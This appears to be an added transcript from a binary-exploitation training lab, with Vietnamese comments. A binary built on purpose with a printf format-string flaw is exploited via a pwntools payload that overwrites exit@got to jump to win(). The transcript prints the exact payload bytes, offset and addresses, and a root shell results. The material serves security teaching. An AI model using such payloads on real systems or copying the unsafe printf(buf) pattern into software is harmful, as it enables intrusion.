@@ -1,0 +1,40 @@
+# Transcript lab 7.2 - format string ghi %n -> GOT overwrite -> shell
+# Moi truong: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0, ASLR bat (randomize_va_space=2)
+# Chay: 2026-10-08T00:11:14Z UTC
+
+$ bash build.sh
+src.c: In function ‘main’:
+src.c:26:12: warning: format not a string literal and no format arguments [-Wformat-security]
+   26 |     printf(buf);     // <--- LOI format string: ghi %n o day
+      |            ^~~
+[*] built: writen
+
+$ checksec (pwntools)
+[*] '/root/techlabs/pwn-p7/lab72/writen'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+RELRO Partial | Canary False | NX True | PIE False
+win 0x401186 | exit@got 0x404030
+
+$ python3 exploit.py   (METHOD=auto: pwntools fmtstr_payload)
+[*] '/root/techlabs/pwn-p7/lab72/writen'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[*] exit@got = 0x404030 , win = 0x401186 , offset = 6
+[*] fmtstr_payload (40 byte): b'%4486c%9$lln%186c%10$hhn0@@\x00\x00\x00\x00\x002@@\x00\x00\x00\x00\x00'
+[+] win() da chay, dang trong shell
+===PWNED_7_2===
+uid=0(root) gid=0(root) groups=0(root)
+6.8.0-134-generic
+===END===
+[OK] ghi de exit@got -> win -> shell thanh cong
